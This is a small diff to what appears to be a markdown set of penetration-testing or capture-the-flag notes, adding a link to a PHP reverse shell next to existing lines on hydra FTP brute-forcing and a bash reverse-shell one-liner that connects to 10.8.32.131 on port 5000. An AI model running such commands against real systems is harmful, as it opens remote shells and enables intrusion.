@@ -140,6 +140,8 @@ You can use hydra to bruteforce FTP access. You should check for executables fil
 
       echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
       
+- PHP reverse shell (for Web Servers): [here](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) 
+      
 As abitual remember setting up a listener on attacker machine.
       
 All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
